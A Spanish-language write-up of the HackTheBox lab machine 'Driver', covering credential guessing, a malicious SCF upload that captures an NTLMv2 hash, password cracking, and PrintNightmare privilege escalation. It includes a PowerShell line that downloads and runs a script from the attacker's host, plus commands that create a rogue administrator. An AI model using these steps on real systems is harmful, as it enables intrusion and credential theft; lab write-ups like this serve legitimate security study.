---
title: HTB - Driver
published: true
categories: [Windows]
tags: [eJPT, OSCP, Fácil]
---


<img src="/assets/HTB/Driver/driver.png">

¡Hola!
Vamos a resolver de la máquina `Driver` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Password Guessing**
- **SCF Malicious File**
- **Print Spooler Local Privilege Escalation (PrintNightmare) [CVE-2021-1675]**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Driver`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.11.106
PING 10.10.11.106 (10.10.11.106) 56(84) bytes of data.
64 bytes from 10.10.11.106: icmp_seq=1 ttl=127 time=42.3 ms

--- 10.10.11.106 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Windows** debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```bash
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.106 -oG allPorts

PORT     STATE SERVICE      REASON
80/tcp   open  http         syn-ack ttl 127
135/tcp  open  msrpc        syn-ack ttl 127
445/tcp  open  microsoft-ds syn-ack ttl 127
5985/tcp open  wsman        syn-ack ttl 127
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p80,135,445,5985 10.10.11.106 -oN targeted

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-title: Site doesn t have a title (text/html; charset=UTF-8).
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-12-12T16:05:35
|_  start_date: 2022-12-12T15:59:10
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s
```
### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://10.10.11.106
http://10.10.11.106 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.106], Microsoft-IIS[10.0], PHP[7.3.25], WWW-Authenticate[MFP Firmware Update Center. Please enter password for admin][Basic], X-Powered-By[PHP/7.3.25]
```

Accedemos al servicio web por el puerto 80 e inmediatamente nos sale un panel de login, aplicando un poco de guessing accedemos con las credenciales `admin:admin`. Estamos ante lo que parece un Centro de actualización de firmware para impresoras

<img src="/assets/HTB/Driver/web.png">

Después de reconocer la web vemos que la única opción funcional de la barra de navegación es la de `Firmware Updates`. Al parecer tenemos capacidad de subir un archivo el cual será revisado por el equipo que gestiona el recurso

<img src="/assets/HTB/Driver/update.png">

Nos viene a la mente generar un archivo `SCF - Shell Command Files` los cuales pueden ser usados para realizar una serie de operaciones tales como mostrar el escritorio de Windows o abrir el explorador de Windows. Sin embargo un archivo SCF puede ser usado para acceder a una determinada ruta que permite al pentester generar un ataque. una búsqueda en Google y encontramos el siguiente recurso de [PentestLab](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)

<img src="/assets/HTB/Driver/payload.png">

Creamos el archivo malicioso `file.scf` en nuestro directorio de trabajo `content` y con la herramienta `impacket-smbserver` compartimos recurso a nivel de red. En la web seleccionamos el archivo creado y ejecutamos pulsando `upload`. Observamos en la respuesta que hemos capturado un hash NTLMv2

```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

.
.
.
tony::DRIVER:aaaaaaaaaaaaaaaa:79449101964ddc557dc8859e604fde18:010100000000000080b050a50e0ed901e552be6bca7aca7f00000000010010004900700063005400630071006f007800030010004900700063005400630071006f0078000200100058007600760052007100450054006a000400100058007600760052007100450054006a000700080080b050a50e0ed901060004000200000008003000300000000000000000000000002000005c6fbac9ffa8d8933ede104cad3057c5aa8d5ea14155c21f0e4459f30074ce840a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0033003400000000000000000000000000
.
.
.
```

Nos copiamos el hash en un archivo el cual trataremos de crackear mediante la herramienta `john`

```shell
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
liltony          (tony)
1g 0:00:00:00 DONE (2022-12-12 11:04) 33.33g/s 1092Kp/s 1092Kc/s 1092KC/s !!!!!!..eatme1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Con `crackmapexec` verificamos que el usuario y password son válidas

```bash
❯ crackmapexec smb 10.10.11.106 -u 'tony' -p 'liltony'
SMB         10.10.11.106  445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
SMB         10.10.11.106  445    DRIVER           [+] DRIVER\tony:liltony 
```
Como tenemos el puerto 5985 abierto verificamos con la misma herramienta pero con el switch de `winrm` que tengamos acceso por este servicio

```bash
❯ crackmapexec winrm 10.10.11.106 -u 'tony' -p 'liltony'
SMB         10.10.11.106  5985   DRIVER           [*] Windows 10.0 Build 10240 (name:DRIVER) (domain:DRIVER)
HTTP        10.10.11.106  5985   DRIVER           [*] http://10.10.11.106:5985/wsman
WINRM       10.10.11.106  5985   DRIVER           [+] DRIVER\tony:liltony (Pwn3d!)
```

Procedemos a conectarnos con `evil-winrm` al servicio de administración remota de Windows

```bash
❯ evil-winrm -i 10.10.11.106 -u 'tony' -p 'liltony'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents> whoami
driver\tony
```

La flag la encontramos en el directorio `Desktop` del usuario `tony`

```bash
*Evil-WinRM* PS C:\Users\tony\Desktop> type user.txt
f323ea7af7e1d20f7***************
```

### Escalada Privilegios

* * *

Tras un reconocimiento manual de los puntos básicos no encontramos nada de utilidad. Seguimos con la herramienta `winPEAS` para un reconocimiento más detallado. Encontramos un servicio activo `spoolsv`. Buscamos en Google por vulnerabilidades asociadas y encontramos el repositorio de GitHub de [calebstewart](https://github.com/calebstewart/CVE-2021-1675). Nos clonamos el repositorio, accedemos a la carpeta creada y compartimos mediante un servidor HTTP con python. Nos lo traemos a la máquina víctima de la siguiente forma

```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.34/CVE-2021-1675.ps1')
```

Lo siguiente es crear un nuevo usuario según nos indican en el repositorio descargado

```bash
*Evil-WinRM* PS C:\Temp\privesc> Invoke-Nightmare -DriverName "Xerox" -NewUser "yorch" -NewPassword "yorch123$!"
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
[+] added user yorch as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```
Confirmamos que el usuario creado está dentro del grupo `Administrators`

```bash
*Evil-WinRM* PS C:\Temp\privesc> net user yorch
User name                    yorch
Full Name                    yorch
Comment
User s comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            12/12/2022 10:17:11 AM
Password expires             Never
Password changeable          12/12/2022 10:17:11 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *None
The command completed successfully.
```

Mediante `evil-winrm` nos podemos conectar con el usuario creado

```bash
❯ evil-winrm -i 10.10.11.106 -u 'yorch' -p 'yorch123$!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\yorch\Documents> whoami
driver\yorch
```

Como estamos dentro del grupo `Administrators` podemos acceder al directorio del usuario `Administrator` y leer la flag

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
daeea542b4a2e550f***************
```

Hemos completado la máquina **Driver** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/Driver/pwned.png">
